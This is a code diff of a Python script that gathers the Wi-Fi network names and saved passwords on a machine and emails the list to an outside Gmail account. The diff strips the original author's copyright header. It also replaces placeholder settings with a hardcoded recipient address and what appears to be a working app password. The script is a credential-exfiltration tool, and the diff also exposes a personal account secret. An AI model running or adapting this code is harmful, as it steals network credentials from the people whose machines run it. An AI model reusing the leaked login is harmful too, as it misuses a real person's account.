@@ -1,9 +1,3 @@
-#! py
-######################################
-#Copyright of David Bombal, 2021     #
-#https://www.davidbombal.com         #
-#https://www.youtube.com/davidbombal #
-######################################
 import subprocess
 import re
 import smtplib
@@ -53,21 +47,18 @@ for item in wifi_list:
     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
 
 # Create EmailMessage Object
-email = EmailMessage()
-# Who is the email from
-email["from"] = "name_of_sender"
-# To which email you want to send the email
-email["to"] = "email_address"
-# Subject of the email
-email["subject"] = "WiFi SSIDs and Passwords"
-email.set_content(email_message)
-
-# Create smtp server
-with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
-    smtp.ehlo()
-    # Connect securely to server
-    smtp.starttls()
-    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
-    smtp.login("login_name", "password")
-    # Send email.
-    smtp.send_message(email)
+msg = EmailMessage()
+recipients=["bhartiabhishek310@gmail.com"]
+msg['From'] = "Abhishek Bharti"
+msg['To'] =  ", ".join(recipients)
+msg['Subject'] = 'List of wifi password'
+msg.set_content(email_message)
+# Send the message via our own SMTP server.
+login_id ="bhartiabhishek310@gmail.com"
+login_pass ="txbcpxomnqqiiwdl"                  #app key different for every person
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(login_id,login_pass)
+# print("login successfully")
+server.send_message(msg)
+# print("Email is successfully sent")
+server.quit()
